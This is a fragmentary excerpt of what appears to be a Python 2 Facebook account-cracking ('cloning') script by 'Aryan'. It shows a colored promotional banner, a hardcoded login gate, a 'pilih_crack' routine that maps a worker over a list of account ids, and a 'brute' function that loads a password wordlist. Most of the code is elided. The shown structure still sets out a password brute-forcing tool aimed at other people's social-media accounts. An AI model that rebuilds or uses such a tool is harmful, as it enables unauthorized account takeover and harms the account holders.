...
\033[1;91m--> GITHUB :- https://github.com/Aryanjan002

\033[1;92m--> FACEBOOK :- Aryanjan

\033[1;93m--> YOUTUBE :ARYAN HACK  
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:Aryan
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;91mWrong Password"
            os.system('xdg-open https://www.youtube.com/channel/1ExuHYC1UBY ')
    else:
...
def pilih_crack():
	...
	p.map(main, id)
	print "▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤"
	print "  Written By Aryan" #Dev:Aryan
	print '\033[1;94mProcess Has Been Completed \033[1;94m....'
        print '\033[1;92mType (python2 Aryan.py) New Fb Start Cloning\033[1;92m....'
...
def brute():
    ...
    try:
        ...
        try:
            ...
            passw = raw_input('\x1b[1;95mWordlist \x1b[1;95m(Type--> Aryan.list) \x1b[1;95m: \x1b[1;95m')
            total = open(passw, 'r')
